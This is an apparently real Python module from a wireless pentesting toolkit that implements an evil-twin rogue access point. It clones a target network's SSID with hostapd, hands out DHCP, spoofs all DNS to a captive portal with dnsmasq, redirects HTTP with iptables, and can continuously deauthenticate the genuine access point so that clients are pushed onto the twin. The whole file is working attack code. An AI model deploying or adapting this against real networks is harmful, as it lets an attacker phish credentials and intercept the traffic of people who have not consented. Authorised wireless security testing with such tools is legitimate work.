# SPDX-License-Identifier: GPL-3.0-or-later
# Copyright (c) 2025 Nerds489
"""Evil-twin rogue access point: hostapd, dnsmasq, and a captive-portal redirect.

This builds a rogue AP that clones a target network, hands out DHCP, spoofs DNS
to a captive portal, and redirects HTTP to it. Two long-standing rough edges are
fixed here:

- band: hostapd ``hw_mode`` is derived from the channel (2.4 GHz -> g, 5 GHz ->
  a) instead of being hard-coded to ``g``.
- firewall: the iptables rules are tracked and torn down by deleting exactly the
  rules that were added, rather than flushing the whole table (which would erase
  unrelated rules). This is the ownership-tracked direction of review finding M-2.

Every host mutation (ip, sysctl, iptables, hostapd, dnsmasq) runs through the
gated host-action seam (:func:`run_host`); the optional deauth of the real AP
runs through the gated aireplay adapter. The config builders are pure and tested.
"""
from __future__ import annotations

from dataclasses import dataclass, field
from pathlib import Path

from netreaper.automation.handlers._host import run_host
from netreaper.core.constants import NETREAPER_CONFIG_DIR
from netreaper.core.logging import get_logger
from netreaper.core.validation import require_interface
from netreaper.tools.aireplay import AireplayTool

logger = get_logger(__name__)


def channel_hw_mode(channel: int) -> str:
    """hostapd hw_mode for a channel: 'g' on 2.4 GHz, 'a' on 5 GHz."""
    if 1 <= channel <= 14:
        return "g"
    if channel >= 36:
        return "a"
    raise ValueError(f"unsupported channel: {channel}")


def hostapd_config(ssid: str, channel: int, interface: str) -> str:
    """Build a hostapd.conf that clones ``ssid`` on the correct band."""
    hw_mode = channel_hw_mode(channel)
    lines = [
        f"interface={interface}",
        "driver=nl80211",
        f"ssid={ssid}",
        f"hw_mode={hw_mode}",
        f"channel={channel}",
        "ieee80211n=1",
        "wmm_enabled=1",
        "macaddr_acl=0",
        "auth_algs=1",
        "ignore_broadcast_ssid=0",
    ]
    return "\n".join(lines) + "\n"


def dnsmasq_config(interface: str, gateway_ip: str) -> str:
    """Build a dnsmasq.conf: DHCP on the rogue subnet, DNS spoofed to gateway."""
    net = gateway_ip.rsplit(".", 1)[0]
    lines = [
        f"interface={interface}",
        f"dhcp-range={net}.10,{net}.250,255.255.255.0,12h",
        f"dhcp-option=3,{gateway_ip}",
        f"dhcp-option=6,{gateway_ip}",
        f"address=/#/{gateway_ip}",  # every hostname resolves to the portal
        "no-resolv",
        "log-queries",
    ]
    return "\n".join(lines) + "\n"


def portal_iptables_rules(
    interface: str, gateway_ip: str, portal_port: int = 80
) -> list[list[str]]:
    """iptables rule argument-lists (append form) for the captive-portal redirect."""
    return [
        ["-t", "nat", "-A", "PREROUTING", "-i", interface, "-p", "tcp",
         "--dport", "80", "-j", "DNAT",
         "--to-destination", f"{gateway_ip}:{portal_port}"],
        ["-t", "nat", "-A", "POSTROUTING", "-o", interface, "-j", "MASQUERADE"],
        ["-A", "INPUT", "-i", interface, "-p", "udp", "--dport", "53", "-j", "ACCEPT"],
        ["-A", "INPUT", "-i", interface, "-p", "udp", "--dport", "67", "-j", "ACCEPT"],
        ["-A", "INPUT", "-i", interface, "-p", "tcp",
         "--dport", str(portal_port), "-j", "ACCEPT"],
    ]


def delete_form(rule: list[str]) -> list[str]:
    """Turn an append/insert rule into its delete form (-A/-I -> -D)."""
    return ["-D" if arg in ("-A", "-I") else arg for arg in rule]


@dataclass
class EvilTwinState:
    interface: str
    ssid: str
    channel: int
    gateway_ip: str
    running: bool = False
    applied_rules: list[list[str]] = field(default_factory=list)


class EvilTwin:
    """Stand up and tear down an evil-twin AP with tracked, reversible state."""

    def __init__(self, runner=run_host, aireplay: AireplayTool | None = None) -> None:
        self._run = runner
        self._aireplay = aireplay or AireplayTool()
        self.state: EvilTwinState | None = None

    async def start(
        self,
        interface: str,
        ssid: str,
        channel: int,
        *,
        gateway_ip: str = "10.0.0.1",
        portal_port: int = 80,
        config_dir: Path | None = None,
    ) -> EvilTwinState:
        """Write configs, bring up the AP subnet, and start hostapd + dnsmasq."""
        iface = require_interface(interface)
        cfg_dir = config_dir or NETREAPER_CONFIG_DIR
        cfg_dir.mkdir(parents=True, exist_ok=True)
        hostapd_path = cfg_dir / "hostapd.conf"
        dnsmasq_path = cfg_dir / "dnsmasq.conf"
        hostapd_path.write_text(hostapd_config(ssid, channel, iface))
        dnsmasq_path.write_text(dnsmasq_config(iface, gateway_ip))

        state = EvilTwinState(iface, ssid, channel, gateway_ip)

        await self._run(["ip", "addr", "add", f"{gateway_ip}/24", "dev", iface],
                        destructive=True)
        await self._run(["ip", "link", "set", iface, "up"], destructive=True)
        await self._run(["sysctl", "-w", "net.ipv4.ip_forward=1"], destructive=True)

        for rule in portal_iptables_rules(iface, gateway_ip, portal_port):
            await self._run(["iptables", *rule], destructive=True)
            state.applied_rules.append(rule)

        # hostapd -B daemonises; dnsmasq daemonises by default.
        await self._run(["hostapd", "-B", str(hostapd_path)], destructive=True)
        await self._run(["dnsmasq", "-C", str(dnsmasq_path)], destructive=True)

        state.running = True
        self.state = state
        logger.info("Evil-twin '%s' up on %s channel %d", ssid, iface, channel)
        return state

    async def deauth_real_ap(
        self, monitor_interface: str, bssid: str, *, count: int = 0
    ) -> None:
        """Deauth the genuine AP to push clients onto the twin (gated aireplay)."""
        await self._aireplay.deauth_attack(
            monitor_interface, bssid, count=count, continuous=count == 0
        )

    async def stop(self) -> None:
        """Tear down: delete exactly the rules added, stop daemons, restore state."""
        state = self.state
        if state is None:
            return

        # Delete exactly the iptables rules we added, in reverse order.
        for rule in reversed(state.applied_rules):
            await self._run(["iptables", *delete_form(rule)], destructive=True)
        state.applied_rules.clear()

        await self._run(["sysctl", "-w", "net.ipv4.ip_forward=0"], destructive=True)
        await self._run(["killall", "hostapd"], destructive=True)
        await self._run(["killall", "dnsmasq"], destructive=True)
        await self._run(["ip", "addr", "del", f"{state.gateway_ip}/24", "dev",
                         state.interface], destructive=True)

        state.running = False
        logger.info("Evil-twin '%s' torn down", state.ssid)
